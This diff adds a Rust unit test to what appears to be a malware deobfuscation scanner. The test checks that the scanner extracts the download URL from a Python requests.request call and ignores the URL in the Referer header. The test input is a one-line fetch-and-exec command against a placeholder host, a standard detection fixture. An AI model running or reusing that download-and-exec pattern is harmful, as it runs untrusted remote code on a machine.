@@ -15486,6 +15486,37 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn python_requests_request_post_keyword_url_ignores_header_literals() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; exec(requests.request(method='POST', headers={'Referer': 'https://py.example/request-post-referer'}, url='https://py.example/request-post-actual').text)""#,
+            &mut env,
+        );
+        let has_actual = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/request-post-actual" && dst.is_none()
+            )
+        });
+        assert!(
+            has_actual,
+            "no structured Download from Python requests.request POST keyword URL: {:?}",
+            env.traits
+        );
+        let promoted_referer = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://py.example/request-post-referer"
+            )
+        });
+        assert!(
+            !promoted_referer,
+            "Python requests.request POST header URL was promoted as structured source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_requests_assigned_request_alias_get_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
